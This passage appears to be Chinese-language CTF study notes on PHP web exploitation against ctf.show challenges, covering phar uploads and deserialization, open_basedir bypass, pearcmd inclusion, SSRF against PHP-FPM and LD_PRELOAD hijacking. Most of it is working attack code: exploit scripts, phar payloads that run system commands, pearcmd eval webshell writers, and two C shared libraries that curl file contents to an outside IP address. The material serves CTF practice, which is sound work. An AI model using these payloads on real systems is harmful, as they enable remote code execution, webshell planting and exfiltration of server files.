-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">url=<span class="string">&quot;http://d4d6bb42-e30d-4ed7-b823-baa8ec7e8cc8.challenge.ctf.show/index.php&quot;</span></span><br><span class="line">data1=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;/tmp/a.phar&#x27;</span>,<span class="string">&#x27;content&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;shell.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()&#125;</span><br><span class="line">data2=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;phar:///tmp/a.phar/a&#x27;</span>,<span class="string">&#x27;content&#x27;</span>:<span class="string">&#x27;123&#x27;</span>,<span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;system(&quot;cat f*&quot;);&#x27;</span>&#125;</span><br><span class="line">requests.post(url,data=data1)</span><br><span class="line">r=requests.post(url,data=data2)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
-
-<p><font style="color:rgb(77, 77, 77);"></font></p>
-<p><font style="color:rgb(77, 77, 77);">例题二：</font></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737595985213-0986b3bc-0e94-4dd9-a526-4673e785c5d5.png"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737595995381-3e5e3dbe-b169-4474-887e-6a77957149f9.png"></p>
-<p><font style="color:rgb(77, 77, 77);">尝试尝试上传一个一句话木马，思路：</font><br><font style="color:rgb(77, 77, 77);">1，写一个一句话木马1.php</font><br><font style="color:rgb(77, 77, 77);">2 把一句话木马压缩成1.zip</font><br><font style="color:rgb(77, 77, 77);">3.把压缩包后缀改名为1.jpg发现上传成功。</font></p>
-<p><font style="color:rgb(77, 77, 77);">再结合上面介绍的phar:&#x2F;&#x2F;伪协议进行解压木马</font></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737596020841-02c6f80e-88f4-43e5-b7c4-18d345da32ad.png"></p>
-<h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><p>phar协议</p>
-<blockquote>
-<p>phar:&#x2F;&#x2F;xxx.phar</p>
-<p>$phar-&gt;setmetadata($h);</p>
-<p>metaData可以存放一个类实例，会将这个类实例以序列化字符串形式存放至Phar文件内</p>
-<p>当使用phar协议加载phar文件时，会自动反序列化这个类的序列化字符串</p>
-<p>总结：</p>
-<p>1.生成phar包时，可以往metaData里面放对象</p>
-<p>2.生成后，对象会自动序列化保存到phar包中</p>
-<p>3.使用phar协议读取phar包时，如果当前脚本识别了这个类，会自动调用这个类的魔术方法</p>
-</blockquote>
-<p>例题一：</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737598367324-3df55798-aba8-4099-a055-62ed78541e9e.png"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;code=<span class="string">&quot;system(&#x27;cat /ffflllaaaggg&#x27;);&quot;</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;exp6.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>扫出&#x2F;upload.php，访问可以发现上传文件，但限制只能上传图片</p>
-<p>问题不大，php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT_COMPILER();?&gt;这段代码，对前面的内容或者后缀名是没有要求的，可以直接修改为其他后缀</p>
-<p>bp抓包改后缀和MIME</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737598416314-ef735066-b35e-491a-b01b-ec7fb83bc20b.png"></p>
-<p>例题二：</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737598448442-36eec9f3-1d88-4522-9edc-9d673be3f014.png"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hacker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">hacker</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;code=<span class="string">&quot;system(&#x27;cat f*&#x27;);&quot;</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://5d5c1d43-55e2-45d0-877a-ef8da113932e.challenge.ctf.show/&quot;</span></span><br><span class="line"> </span><br><span class="line">file=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;/tmp/a.phar&#x27;</span>,<span class="string">&#x27;content&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;test.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()&#125;</span><br><span class="line">data=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;phar:///tmp/a.phar&#x27;</span>,<span class="string">&#x27;content&#x27;</span>:<span class="string">&#x27;suibian&#x27;</span>&#125;</span><br><span class="line">requests.post(url,data=file)</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
-
-<h1 id="open-basedir绕过"><a href="#open-basedir绕过" class="headerlink" title="open_basedir绕过"></a>open_basedir绕过</h1><blockquote>
-<p>open_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域。</p>
-<p>在php.ini中设置open_basedir的值：</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737598653597-78076e4b-7c00-4b87-a8ae-cf86fdff03fc.png"></p>
-<p>设置open_basedir&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;,通过web访问服务器的用户就无法获取服务器上除了&#x2F;var&#x2F;www&#x2F;html&#x2F;这个目录以外的文件。</p>
-<p>假设这时连接一个webshell,当webshell工具尝试遍历和读取其他目录时将会失败。</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737598672502-93cf8f8b-0cdf-4d5c-8960-5e110b127c63.png"></p>
-</blockquote>
-<p>open_basedir对命令执行函数没有限,使用system()函数试一下：</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737598726382-436e58b2-64f9-459c-a951-0146c2dd32b3.png"></p>
-<p>实际情况中,可能system()函数由于disable_function禁用无法使用,可通过同类执行命令函数绕过。</p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10070?time__1311=mq+xBD9QDQe4RDBkPoGkFoD=q0QY+Ux=x&alichlgref=https://www.google.com.hk/#toc-12">从0学习bypass open_basedir姿势 - 先知社区</a></p>
-<p>例题：</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737599060759-23204e5c-237c-4594-905d-a97fea024c45.png"></p>
-<p>先看下函数禁用</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737599074977-70055793-cc2b-46a0-9dde-74bcc1f1ef82.png"></p>
-<p> payload:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>=mkdir(<span class="string">&#x27;sub&#x27;</span>);chdir(<span class="string">&#x27;sub&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);var_dump(scandir(<span class="string">&#x27;/&#x27;</span>));</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>=mkdir(<span class="string">&#x27;sub&#x27;</span>);chdir(<span class="string">&#x27;sub&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);readfile(<span class="string">&#x27;/ctfshowflag&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="pear文件包含"><a href="#pear文件包含" class="headerlink" title="pear文件包含"></a><font style="color:rgb(34, 34, 38);">pear文件包含</font></h1><p>条件：</p>
-<ol>
-<li>register_argc_argv&#x3D;on开启，在php.ini中可以开启—-查看phpinfo，如果题目直接告诉我们能看phpinfo，那这个的可能性就更大了。</li>
-<li>必须安装pecl&#x2F;pear，pecl是PHP用于管理扩展使用的命令工具，pecl是pear以来的库类，在Docker任意的镜像版本中默认安装，安装路径为&#x2F;uer&#x2F;local&#x2F;lib&#x2F;php。</li>
-</ol>
-<p>原理：</p>
-<blockquote>
-<p>pear的默认安装路径为&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pear.php，在命令行中可以使用pear和&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pear.php运行，如果存在文件包含漏洞，则可以直接运行此命令，下面我们介绍一下register_argc_argv选项，如果此选项打开，则此时用户输入的内容可能会传入到$argc、$argv、$_SERVER[‘argc’]这几个变量中，下面直接给出结论</p>
-<p>从URL？后面的内容会全部传入到$_SERVER[‘argc’]这个变量中，不管是否有等号存在。即pear会在pearcmd.php中获取命令行参数。</p>
-</blockquote>
-<p>pear是一个命令有参数，我们重点看一个：</p>
-<blockquote>
-<p>config-creater:创建一个默认配置文件</p>
-<p>config-create: must have 2 parameters, root path and filename to save as</p>
-<p>必须传入两个参数，第一个为绝对路径，第二个为创建文件的文件名</p>
-<p>注意传入的内容是通过+来作为分隔符的。即空格经过url编码后+，我们尝试一段命令</p>
-<p>pear config-creater &#x2F;<?=@eval($_POST[1]);?> &#x2F;tmp&#x2F;test.php</p>
-<p>可以发现成功写入，我们现在解释上面的命令，在插入内容<?=@eval($_POST[1]);?>前加上&#x2F;目的是引入绝对路径，后面为创建文件的文件保存地址和文件名。</p>
-<p>值得注意的是，上面的命令并不适用与文件包含的格式来写入shell,由于$_SERVER[‘argv’]变量会将URL的?后面的值都传入pear当作参数，所以此处file需要调换一下位置，并且在适当位置加上&#x2F;和+，所以我们更改代码</p>
-<p>?+config-creater+&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;&#x2F;<?=eval($_POST[1]);?>+&#x2F;var&#x2F;www&#x2F;html&#x2F;hello.php</p>
-<p>上述代码会将&#x2F;&amp;file&#x3D;&#x2F;usr&#x2F;share&#x2F;php&#x2F;pearcmd.php&amp;&#x2F;<?=@eval($_POST[1]);?>作为一个目录，也就是第一个参数，将其shell写入&#x2F;var&#x2F;www&#x2F;html&#x2F;hello.php，然后再包含这个文件。</p>
-</blockquote>
-<p>例题一：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//Can you get shell? RCE via LFI if you get some trick,this question will be so easy!</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/base64|rot13|filter/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">&#125; Hacker!</span><br></pre></td></tr></table></figure>
-
-<p>payload：</p>
-<blockquote>
-<p>?+config-create+&#x2F;&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd&amp;&#x2F;<?=phpinfo()?>+&#x2F;var&#x2F;www&#x2F;html&#x2F;hello.php</p>
-</blockquote>
-<p>file后面是pearcmd的默认路径，因为Index.php提示了后面会加php，所以直接&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd就好了。第二个&amp;后就是第一个参数，第三个+后是第二个参数。</p>
-<p>不要在url中直接上传因为&lt;&gt;在url传输中会出现解码错误，用burpsuite传输修改。</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737684689217-39cfe111-3aba-4fbe-8d87-261f7820db10.png"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737684705933-cd14faec-8b20-4b7f-883d-9e255adc2839.png"></p>
-<p>例题二：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/input|data|phar|log|filter/i&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>题目明示我们能看phpinfo，我们直接看一下。</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737684866918-f5bca782-a894-4ed6-9e4b-ce8e945412ce.png"></p>
-<p>开着，那就直接pear了。</p>
-<p>操作同上，就是.php要加上。</p>
-<h1 id="SSRF打PHP-FPM"><a href="#SSRF打PHP-FPM" class="headerlink" title="SSRF打PHP-FPM"></a>SSRF打PHP-FPM</h1><p>相关文章：</p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/9043">文章 - Fastcgi 协议分析与 PHP-FPM 攻击方法 - 先知社区</a></p>
-<p>PHP-FPM 是基于 FastCGI 协议的 PHP 进程管理器</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_URL,<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_HEADER,<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_RETURNTRANSFER,<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_FOLLOWLOCATION,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>直接拿工具打：</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737687522322-07ca50ae-6bac-492e-b7ce-e47cdfd5b62b.png"></p>
-<p>记得_后面的内容再进行一次url编码。</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737687531563-12e311b3-d0d6-47da-a923-718d1a795ea2.png"></p>
-<h1 id="劫持getuid"><a href="#劫持getuid" class="headerlink" title="劫持getuid"></a>劫持getuid</h1><p>利用条件：</p>
-<p>1.有文件写入点 2.可执行putenv命令 3.执行了可以生成新进程的函数</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1739702013852-2a566020-40f8-4aaa-85b3-93354eb86dcc.png"></p>
-<blockquote>
-<p>关于LD_PRELOAD:LD_PRELOAD 是一个用于动态链接器的环境变量，它可以指定一个共享库（通常是一个预加载库），在程序启动时优先加载该库，覆盖系统默认的同名函数。LD_PRELOAD 的作用主要是用来干预程序的动态链接过程，通过提供自定义的共享库，可以重定义或增强程序中的特定函数的行为。</p>
-<p>关于getuid:在php中，如果要启动一个新的进程，那么这个进程会调用getuid函数，如果通过环境变量LD_PRELOAD指定恶意的so文件，那么只要新建进程，就会执行我们的恶意代码。这里的system就起到了新建进程的作用。</p>
-</blockquote>
-<p>生成恶意so文件：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span>&#123;</span><br><span class="line">        system(<span class="string">&quot;curl http://124.222.136.33:1337?flag=`cat /f*`&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">getuid</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span>(getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>)==<span class="literal">NULL</span>)&#123; <span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">        unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">        payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC web814.c -o <span class="built_in">exp</span></span><br><span class="line">gcc --share <span class="built_in">exp</span> -o <span class="built_in">exp</span>.so</span><br></pre></td></tr></table></figure>
-
-
-
-<p>传入：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://1bf3813f-c8e6-4e42-9732-07e5b46c496e.challenge.ctf.show/&quot;</span></span><br><span class="line">data=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;/tmp/exp.so&#x27;</span>,<span class="string">&#x27;content&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;exp.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()&#125;</span><br><span class="line">requests.post(url+<span class="string">&#x27;?a=write&#x27;</span>,data=data)</span><br><span class="line">requests.get(url+<span class="string">&#x27;?a=run&amp;env=LD_PRELOAD=/tmp/exp.so&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<h1 id="劫持构造器"><a href="#劫持构造器" class="headerlink" title="劫持构造器"></a>劫持构造器</h1><blockquote>
-<p>在 C 语言中，attribute((constructor)) 是一种扩展修饰符，用于指定一个函数作为在程序启动时自动执行的构造函数。当使用了这个修饰符之后，这个函数会在程序运行之前被自动调用，用于执行一些初始化操作。</p>
-<p>使用 attribute((constructor)) 修饰的函数会在 main 函数执行之前被调用，并且可以有多个这样的构造函数，它们的调用顺序取决于编译器和链接器的实现。</p>
-<p>也就是说只要启动新进程，就会统一调用这个恶意构造函数，比劫持getuid更通用，原理基本一致。</p>
-</blockquote>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1739702196970-7994a2d3-a20a-4389-9c33-d47ed4e82d5e.png"></p>
-<p>这里mail()起到了新建进程的作用，直接打LD_PRELOAD</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span>** environ;</span><br><span class="line"> </span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">hack</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;curl http://124.222.136.33:1337?flag=`cat /f*`&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p> 生成恶意so文件：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC web815.c -o <span class="built_in">exp</span>&amp;&amp;gcc --share <span class="built_in">exp</span> -o <span class="built_in">exp</span>.so</span><br></pre></td></tr></table></figure>
-
-
-
-<p>脚本打：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://9049c4b6-7b93-431d-a82b-907f48363ee1.challenge.ctf.show/&quot;</span></span><br><span class="line">data=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;/tmp/exp.so&#x27;</span>,<span class="string">&#x27;content&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;exp.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()&#125;</span><br><span class="line">requests.post(url+<span class="string">&#x27;?a=write&#x27;</span>,data=data)</span><br><span class="line">requests.get(url+<span class="string">&#x27;?a=run&amp;env=LD_PRELOAD=/tmp/exp.so&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1739702248552-3d050c9c-e1df-4110-b132-21b53257a8ae.png"></p>
-<h1 id="临时文件利用"><a href="#临时文件利用" class="headerlink" title="临时文件利用"></a>临时文件利用</h1><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1739702350333-fa4e9285-8396-4fa6-9a96-3995a338fc62.png"></p>
-<blockquote>
